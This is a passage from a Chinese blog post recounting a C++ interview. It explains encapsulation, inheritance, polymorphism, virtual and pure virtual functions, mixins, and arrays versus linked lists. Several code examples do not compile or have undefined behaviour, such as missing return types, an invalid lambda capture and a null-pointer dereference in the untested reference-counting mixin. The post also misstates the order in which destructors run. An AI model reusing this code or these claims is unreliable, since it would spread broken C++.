&lt;p>下面面试官的提问并非原话，有经过脑补润色。&lt;/p>
&lt;/blockquote>
&lt;h2 id="起手式面向对象">起手式：面向对象&lt;/h2>
&lt;blockquote>
&lt;p>面试官：讲讲面向对象，继承，还有多态。我们都知道程序设计有两种常见的范式，面向过程和面向对象，讲讲面向对象给我们带来了什么好处？&lt;/p>
&lt;/blockquote>
&lt;p>实话说第一问就已经有点出乎意料，但想想其实还是在意料之中。初级职位更注重于基础概念和技能，中高级职位可能会在数据结构和并发一类的问题上更深入。&lt;/p>
&lt;blockquote>
&lt;p>答：抽象，归类 blabla&amp;hellip;易于维护 blabla&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>全错。&lt;/strong>&lt;/p>
&lt;p>现在回忆起来，面试官想问的其实只有一点，就是那句&lt;strong>封装&lt;/strong>。&lt;/p>
&lt;p>&lt;strong>封装&lt;/strong>是面向对象的&lt;strong>核心概念之一&lt;/strong>。&lt;/p>
&lt;p>封装使代码成为一个&lt;strong>黑箱&lt;/strong>，让我们不必关注它的实现，而是关注它的&lt;strong>行为&lt;/strong>和&lt;strong>接口&lt;/strong>。&lt;/p>
&lt;p>这产生了&lt;strong>面向接口编程&lt;/strong>的概念，我们不再关注封装后的对象内部的逻辑，我们给封装后的对象以输入，然后从封装后的对象里取出数据。&lt;/p>
&lt;p>&lt;strong>封装&lt;/strong>并不只是一系列接口的集合，更包含了&lt;strong>数据&lt;/strong>和&lt;strong>状态&lt;/strong>，它就是一个微型化的服务，调用者告诉它去做什么事，而不关心它怎么做。&lt;/p>
&lt;h2 id="第二招继承">第二招：继承&lt;/h2>
&lt;blockquote>
&lt;p>面试官：讲讲继承。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>我：代码复用，blabla&amp;hellip;&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>代码复用，这是核心。&lt;/strong>&lt;/p>
&lt;p>代码复用是继承最主要的作用，大家都知道。面试官并没有在这方面继续深入，所以能答出代码复用其实已经差不多了。&lt;/p>
&lt;p>除非再抠上语言相关的语法细节：&lt;strong>多继承&lt;/strong>和&lt;strong>单继承&lt;/strong>。&lt;/p>
&lt;h3 id="多继承">多继承&lt;/h3>
&lt;p>C++ 采用了多继承模型，即一个子类可以有多个父类。&lt;/p>
&lt;pre>&lt;code>Father ------|
|====&amp;gt; child
Mother ------|
&lt;/code>&lt;/pre>&lt;p>多继承可以允许一些特殊的编程范式。比如说&lt;code>mixin&lt;/code>模式。但是多继承也存在其固有的复杂性，主要表现在运行时多态上。&lt;/p>
&lt;p>举几个多继承上常见的问题。&lt;/p>
&lt;ol>
&lt;li>父类成员冲突&lt;/li>
&lt;/ol>
&lt;p>典型场景如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="k">class&lt;/span> &lt;span class="nc">ParentA&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="n">func&lt;/span>&lt;span class="p">(){}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">ParentB&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="n">func&lt;/span>&lt;span class="p">(){}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">ParentA&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ParentB&lt;/span> &lt;span class="p">{};&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">Child&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">func&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="c1">// error
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>解决办法也很简单&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">Child&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ParentA&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">func&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>之所以如果不调用 &lt;code>func&lt;/code> 就不会出错，是因为 &lt;code>func&lt;/code> 在编译后的 ABI 导出的名字并没有产生冲突。但如果主动调用了&lt;code>func&lt;/code>，编译器则需要插入一个函数调用，但这里的&lt;code>func&lt;/code>语义却是不明确的，所以编译阶段就会报告错误。&lt;/p>
&lt;ol start="2">
&lt;li>&lt;code>dynamic_cast&lt;/code>会改变指针&lt;/li>
&lt;/ol>
&lt;p>&lt;code>dynamic_cast&lt;/code>是基于 RTTI 的运行时类型安全的标准类型转换，&lt;code>dynamic_cast&lt;/code>本身是一个关键字，这里就说一说&lt;code>dynamic_cast&lt;/code>的行为和多继承。&lt;/p>
&lt;p>多继承下的&lt;code>dynamic_cast&lt;/code>会修改指针绝非危言耸听。事实上只要稍作思考就能得出这样的结论：多继承下的内存布局应该是什么样子的？&lt;/p>
&lt;pre>&lt;code>v Pointer to Child
v Pointer to ParentB
v Pointer to ParentA
| ParentA | ParentB | Child |
[-----------====================&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;]
&lt;/code>&lt;/pre>&lt;p>C++ 鼓吹&lt;code>Zero cost abstraction&lt;/code>也不是一天两天的事情了，成果如何不予置评，但显然，专门为多继承下的指针附加类型信息，以允许&lt;code>ParentB*&lt;/code>类型的指针指向的地址和&lt;code>Child*&lt;/code>相同是不可能的。&lt;/p>
&lt;p>遑论 C++标准里根本没&lt;code>地址&lt;/code>这回事儿了，指针指向的是啥玩意儿都有可能。&lt;/p>
&lt;h3 id="单继承">单继承&lt;/h3>
&lt;p>单继承就简单得多，只允许一个父类存在，根据语言设计也可能允许实现多个接口。比如说&lt;code>Java&lt;/code>和&lt;code>C#&lt;/code>。以我比较熟悉的 &lt;code>Rust&lt;/code> 为例（暂不提继承，因为&lt;code>Rust&lt;/code>就没继承这码事儿，全是&lt;code>Trait&lt;/code>），一个&lt;code>struct&lt;/code>可以实现多个&lt;code>Trait&lt;/code>，然后以&lt;code>Trait object&lt;/code>来实现对象多态。&lt;/p>
&lt;p>单继承更多是在多态、重载、接口等方面的取舍，就不细谈了。&lt;/p>
&lt;h2 id="第三招多态">第三招：多态&lt;/h2>
&lt;h2 id="多态和面向接口编程">多态和面向接口编程&lt;/h2>
&lt;blockquote>
&lt;p>面试官：知道多态吗？多态有什么好处？&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>答：多态就是&amp;hellip;blabla&amp;hellip;不去关注子类细节，归类成 xxx&amp;hellip;&amp;hellip;blabla&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>多态&lt;/strong>算是面向对象基本概念之一了。&lt;/p>
&lt;p>多态最基本的解释就是&lt;strong>同一个接口的不同实现&lt;/strong>，但我理解中的&lt;strong>多态&lt;/strong>解释则更趋向于&lt;strong>类型擦除&lt;/strong>，即&lt;strong>我不在乎你是什么黑人、白人、黄种人、香蕉人，我只要你能做到某件事&lt;/strong>。本质上来说，多态的主要作用就是&lt;strong>擦除细节&lt;/strong>。&lt;/p>
&lt;p>举个例子，我打算去面试一家公司，面试官想要的是什么呢？他想要的是&lt;strong>能干活的人&lt;/strong>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="k">class&lt;/span> &lt;span class="nc">Worker&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">declarePay&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">declareEfficiency&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BOOL&lt;/span> &lt;span class="nf">testWorkEfficiency&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SomeShit&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="n">Worker&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Company&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">BOOL&lt;/span> &lt;span class="n">hire&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Worker&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="p">...&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>面试者可能是&lt;code>HardWorker&lt;/code>，&lt;code>FxxkWorker&lt;/code>都是&lt;code>Worker&lt;/code>实例，但他们也同时是&lt;code>Human&lt;/code>，可能是&lt;code>Wife&lt;/code>，可能是&lt;code>Husband&lt;/code>，也可能是&lt;code>Father&lt;/code>、&lt;code>Mother&lt;/code>，但是这些我们都不关心。&lt;/p>
&lt;p>我们不可能为每个&lt;code>People某某某&lt;/code>各自定义一个&lt;code>BOOL hirePeople某某某() {}&lt;/code>，我们关注的是工作能力，所以我们要在类型里擦除掉这些无关的细节，保留关注的部分。&lt;/p>
&lt;p>多态做的就是这样的一件事：我不在乎你是谁，我在乎你是不是能干好这件事的人。&lt;/p>
&lt;p>这么说其实有些脱离主题了，因为这是&lt;strong>面向接口编程&lt;/strong>的思想，而不是对&lt;strong>多态&lt;/strong>的学术解释，但这确实就是我对多态的理解，它的主要作用就是&lt;strong>隐藏差异&lt;/strong>，进而发展为&lt;strong>擦除细节&lt;/strong>。&lt;/p>
&lt;p>我的回答其实根本没到点上，也没 Get 到面试官的 point，所以面试官很快就换了下一个问题。&lt;/p>
&lt;h2 id="谈谈虚函数">谈谈虚函数&lt;/h2>
&lt;blockquote>
&lt;p>面试官：虚函数的作用是什么？&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>答：啊？实现多态啊？&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>可以说是最差的回答。&lt;/strong>&lt;/p>
&lt;p>面试中没有反应过来问的啥，知道被拒绝了才突然明白。&lt;/p>
&lt;p>o(￣ヘ￣ o＃)&lt;/p>
&lt;p>这已经问到语言细节了，所以咱们就从语言出发来讲。&lt;/p>
&lt;h3 id="多态">多态&lt;/h3>
&lt;p>首先虚函数是什么？虚函数是 C++实现多态的手段，这么答没错，学过 C++都知道。不过虚函数不仅仅是这一点。&lt;/p>
&lt;p>咱先从这一点讲起。&lt;/p>
&lt;p>虚函数通过一个叫虚函数表的东西来实现多态，这个虚函数表是实现定义的，标准没有对&lt;code>vtable&lt;/code>做什么规定，比如说必须放在类指针的前后几个字节处啊什么的&amp;hellip;&amp;hellip;不存在的。所以也不谈虚表是怎么实现的，这已经是具体到平台和编译器上的差别了，要抠这个的话必须去读编译器和平台相关的各种文档了，PE 格式啊 DLL 啊 SharedObject 啊什么的。&lt;/p>
&lt;p>如果问起来的话&amp;hellip;&amp;hellip;嗯&amp;hellip;&amp;hellip;这个职位应该很厉害。&lt;/p>
&lt;p>所以我就跳过了。&lt;/p>
&lt;p>直接给个虚函数的实例，真的没什么好说的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">ParentA&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="n">vFunc&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ParentA&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Child&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="n">ParentA&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="n">vFunc&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">override&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;Child&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 顺便写调用父类的
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">ParentA&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">vFunc&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="虚析构函数">虚析构函数&lt;/h3>
&lt;p>C++虚函数的另一个重要用途就是虚析构函数。&lt;/p>
&lt;p>因为&amp;hellip;&amp;hellip;C++对象模型中，析构函数的位置十分尴尬。&lt;/p>
&lt;p>构造函数也就算了，无论如何也要显式调用一次。&lt;/p>
&lt;p>析构函数则因为多态的存在而十分尴尬：给你一个父类指针列表，你显然不能一个一个检查这些指针指向是什么对象，然后再转回去，最后才 &lt;code>delete&lt;/code> 它。&lt;/p>
&lt;p>光是听起来就麻烦得要死，更别提有时候根本做不到。C++脆弱的&lt;code>RTTI&lt;/code>和基本不存在的&lt;code>Reflection&lt;/code>可是出了名的。&lt;/p>
&lt;p>C++对这个问题的解决办法就是虚析构函数。&lt;/p>
&lt;p>和一般的虚函数不同，一般的虚函数一旦被&lt;code>override&lt;/code>，除非你主动调用指定父类的虚方法，否则调用的必然是继承链最后一个&lt;code>override&lt;/code>了这个虚方法的类的虚方法实现。&lt;/p>
&lt;p>析构函数的话就稳了，它会链式的调用继承链上每个类的析构方法，多继承的情况下则是按照继承的顺序调用析构方法。&lt;/p>
&lt;p>&lt;strong>不用主动写&lt;code>ParentA::~ParentA()&lt;/code>，是不是特别爽？&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>还行，这就是个语法糖。&lt;/p>
&lt;/blockquote>
&lt;h3 id="纯虚函数和抽象类">纯虚函数和抽象类&lt;/h3>
&lt;p>最后是纯虚函数。&lt;/p>
&lt;p>其实这玩意儿我更愿意称他为&lt;strong>接口&lt;/strong>。&lt;/p>
&lt;p>本质上来说，纯虚函数规定了一个&lt;strong>方法&lt;/strong>，这个方法接收固定的&lt;strong>输入&lt;/strong>，并保证提供一个&lt;strong>输出&lt;/strong>，相应的可能还有&lt;strong>异常声明&lt;/strong>，来说明这个方法可能抛出的异常。&lt;/p>
&lt;p>怎么样，看起来眼熟不？&lt;/p>
&lt;p>还没完，纯虚方法没有实现（你开心的话也可以写个实现），强制要求子类必须实现，而定义了纯虚方法的类被称之为&lt;strong>抽象类&lt;/strong>。&lt;/p>
&lt;p>我想就算是叫它&lt;strong>接口类&lt;/strong>它也不会反对的吧。&lt;/p>
&lt;p>纯虚函数可以类比于&lt;code>C#&lt;/code>的&lt;code>interface&lt;/code>，或者&lt;code>typescript&lt;/code>的&lt;code>interface&lt;/code>，总之就是各种语言的&lt;code>interface&lt;/code>。这些&lt;code>interface&lt;/code>在具体的规定上可能有所差异，比如说不允许写数据成员啦，数据成员写了不算在实现&lt;code>interface&lt;/code>的类上还要再声明一次啦，&lt;code>interface&lt;/code>的方法可不可以有个默认实现啦，这些都是细节。&lt;/p>
&lt;p>还记得上面我说&lt;strong>多态&lt;/strong>吗？多态的目的是&lt;strong>擦除类型细节&lt;/strong>，所以这些长得各不相同百花齐放的&lt;code>interface&lt;/code>做的事情其实都是一回事：你能做啥，那么你是啥。&lt;/p>
&lt;p>这里再说个细节，纯虚函数作为析构函数的时候，析构函数应该有个实现&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>听起来挺奇怪的？不写纯虚析构函数实现的话，会报个链接错误&amp;hellip;至于为什么要这么做，其中的取舍就不得而知了。&lt;/p>
&lt;p>C++的纯虚函数和抽象类很灵活，没有其他语言&lt;code>interface&lt;/code>种种限制，如果要追问纯虚函数&lt;/p>
&lt;blockquote>
&lt;p>when? where? why?&lt;/p>
&lt;/blockquote>
&lt;p>那就要看到具体场景了，C++这些灵活的特性一不小心就会变成滥用，反正这么问我应该也就答&lt;code>interface&lt;/code>、&lt;code>mixin&lt;/code>以及其他具体需求的场景这样子了。&lt;/p>
&lt;h3 id="mixin-模式">Mixin 模式&lt;/h3>
&lt;p>&lt;code>Mixin&lt;/code>模式在&lt;code>Python&lt;/code>里比较常见，不过 C++也并不是没有。通过定义纯虚析构函数，来给一个对象混入特定功能而又不允许自己被独立构建，算是个常见的范式。&lt;/p>
&lt;p>举个例子，引用计数，如果发现自己引用归零了就释放资源，线程安全之类的问题先不管，仅仅是展示这个范式。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">RcMixin&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">private&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="n">deleter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">_rc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">deleter&lt;/span> &lt;span class="n">resDeleter&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">RcMixin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">deleter&lt;/span> &lt;span class="n">resDeleter&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="n">resDeleter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">resDeleter&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">_rc&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// 线程安全就先放一边
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="n">RcMixin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">RcMixin&lt;/span>&lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">other&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">resDeleter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">other&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resDeleter&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">_rc&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="n">RcMixin&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">_rc&lt;/span>&lt;span class="o">-=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">_rc&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">resDeleter&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="c1">// 虽然是个RcMixin但是外界并不需要知道它是RcMixin
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">class&lt;/span> &lt;span class="nc">SomeShit&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">private&lt;/span> &lt;span class="n">RcMixin&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">private&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="kt">int&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">public&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">SomeShit&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="o">:&lt;/span> &lt;span class="n">RcMixin&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">delete&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">res&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">})&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">res&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">virtual&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="n">SomeShit&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">SomeShit&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>代码没测过，反正大概就是这种感觉，将某些功能混入一个现存的类，而不需要做太多的工作。在 C++里没那么方便，强类型下的 Mixin 需要很多变通技巧才能愉快地混入新功能，而鸭子类型&lt;code>Duck typing&lt;/code>的语言则舒爽很多，当然，最好的还是具有完善 &lt;code>Reflection&lt;/code> 和 &lt;code>Attribute&lt;/code> 支持的语言，完全避免了对&lt;code>Mixin&lt;/code>类型的构造和需要利用的数据的绑定一类的不必要的关注。&lt;/p>
&lt;h3 id="扩展虚继承">扩展：虚继承&lt;/h3>
&lt;p>同样是 &lt;code>virtual&lt;/code> 关键字，虚继承和虚函数关系就不怎么大了。&lt;/p>
&lt;p>虚继承面对的问题是&lt;strong>多继承时，多个父类继承自同一个基类&lt;/strong>这一问题。&lt;/p>
&lt;p>听起来是不是有点奇怪？这些父类继承自同一个基类会有什么问题？&lt;/p>
&lt;p>事实上，这个问题取决于写出多继承代码的人，也取决于这多个父类是否有对多继承方面做过考虑。&lt;/p>
&lt;p>举个简单的例子，&lt;code>ParentA&lt;/code>和&lt;code>ParentB&lt;/code>都继承自&lt;code>DataA&lt;/code>，&lt;code>ParentA&lt;/code>修改了&lt;code>DataA&lt;/code>的数据，但&lt;code>ParentB&lt;/code>不知道。如果&lt;code>ParentB&lt;/code>需要根据&lt;code>DataA&lt;/code>的某些数据进行操作——很遗憾，这个行为可能与预期的不同。&lt;/p>
&lt;p>之所以引入虚继承，是为了解决&lt;strong>要不要共享同一个基类实例&lt;/strong>的问题，选择虚继承，则选择共享基类实例。&lt;/p>
&lt;p>共享基类实例的优势是，多个父类的功能可以无缝结合。&lt;code>ParentA&lt;/code>和&lt;code>ParentB&lt;/code>可以共享基类定义的&lt;code>Mutex&lt;/code>等状态资源——当然，前提是设计父类的人有过这方面的考虑。&lt;/p>
&lt;p>不然的话，不共享基类实例是个保守但更安全，不易出现歧义的选择。&lt;/p>
&lt;h2 id="第四招数组和链表">第四招：数组和链表&lt;/h2>
&lt;blockquote>
&lt;p>面试官：我们聊一下数据结构方面吧&amp;hellip;..讲一下数组和链表？可以从访问和删除两方面来说。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>答：数组允许随机访问，只需要一步就能找到对应元素，而链表需要&amp;hellip;&amp;hellip;blabla，数组删除元素如果需要移动后续元素的话，会产生复制操作性能损失，链表只需要修改几个指针&amp;hellip;blabla。&lt;/p>
&lt;/blockquote>
&lt;p>实际上答到这里我已经不知道自己在说啥了。&lt;/p>
&lt;p>数组和链表的区别还是挺大的，我应该算是 Get 到了几个点？下面是重新整理了语言后的回答。&lt;/p>
&lt;h3 id="数组和链表的内存布局">数组和链表的内存布局&lt;/h3>
&lt;p>数组和链表两者都是线性数据结构，表现上都是一条有头有尾的有序序列，但是储存方式上有区别。&lt;/p>
&lt;p>数组的储存方式是一端连续的内存空间，索引只需要进行一次指针运算即可获得目标元素的位置，也可以理解为访问时间始终是&lt;code>O(1)&lt;/code>。&lt;/p>
&lt;blockquote>
&lt;p>PS: 还能写出 0[array] 这样的骚写法，不怕被打死的话。&lt;/p>
&lt;/blockquote>
&lt;p>链表的内存布局则是分散的，通常的链表实现往往是插入元素时动态分配一个元素的空间，而删除的时候再释放，长此以往对内存是不友好的，容易产生内存碎片，导致分配较大空间时无法寻得足够长的连续内存片段而造成分配失败。&lt;/p>
&lt;p>&amp;hellip;&amp;hellip;当然，是长期才会产生的问题，而且是切实存在的问题。&lt;/p>
&lt;h3 id="索引">索引&lt;/h3>
&lt;p>对于数组来说的话，可以理解成标准库的 &lt;code>std::array&lt;/code>，也可以理解成原始数组，但不变的是索引方式始终是&lt;code>O(1)&lt;/code>复杂度，而且支持随机访问迭代器。&lt;/p>
&lt;p>对于链表来说，不考虑优化后的变体，索引方式在本质上都是顺序访问迭代器——指针也算是概念上的迭代器。所以对于链表，访问时间的复杂度最坏情况应该是&lt;code>O(n)&lt;/code>，&lt;code>n&lt;/code>是链表长度。不用说，索引性能自然是不如数组的。&lt;/p>
&lt;h3 id="删除">删除&lt;/h3>
